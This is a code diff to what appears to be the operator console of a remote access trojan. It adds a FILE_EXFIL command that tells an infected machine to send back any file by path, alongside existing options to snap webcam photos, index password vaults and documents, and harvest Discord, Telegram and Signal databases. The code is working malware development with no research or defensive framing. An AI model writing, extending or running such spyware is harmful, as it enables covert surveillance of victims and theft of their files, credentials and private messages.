@@ -262,6 +262,7 @@ static void display_prompt(int persistence)
     printf(" 15 - CAMERA_SNAPSHOT            Capture webcam photo [HIGH RISK: triggers camera indicator light on target]\n");
     printf(" 16 - FILE_SEARCH                Index sensitive files (.docx .pdf .kdbx .xlsx) under C:\\Users\\\n");
     printf(" 17 - MESSAGING_STEAL            Harvest Discord, Telegram & Signal local databases\n");
+    printf(" 18 - FILE_EXFIL                 Exfiltrate a specific file by path (max 100 MB)\n");
     printf("> ");
     fflush(stdout);
 }
@@ -279,9 +280,9 @@ static int console_input(int persistence)
         if (strchr(input_buffer, '\n') == NULL)
             flush_stdin();
         if (sscanf(input_buffer, "%d", &choice) == 1 &&
-            choice >= 0 && choice <= 17)
+            choice >= 0 && choice <= 18)
             break;
-        printf("INVALID INPUT! Please enter an integer from 0-17.\n");
+        printf("INVALID INPUT! Please enter an integer from 0-18.\n");
     }
     return choice;
 }
@@ -559,6 +560,19 @@ static void run_command_loop(int slot)
                 if (process_response(resp, s->request_id, conn) == -1)
                     connected = 0;
             }
+            break;
+        }
+
+        case 18: { /* FILE_EXFIL */
+            char *path = parameters_input("Enter full file path to exfiltrate: ");
+            s->request_id++;
+            Packet pkt = {COMMAND_FILE_EXFIL, s->request_id,
+                          (int)strlen(path), path};
+            send_packet(&pkt, conn);
+            free(path);
+            Packet *resp = recieve_packet(conn);
+            if (process_response(resp, s->request_id, conn) == -1)
+                connected = 0;
             break;
         }
 
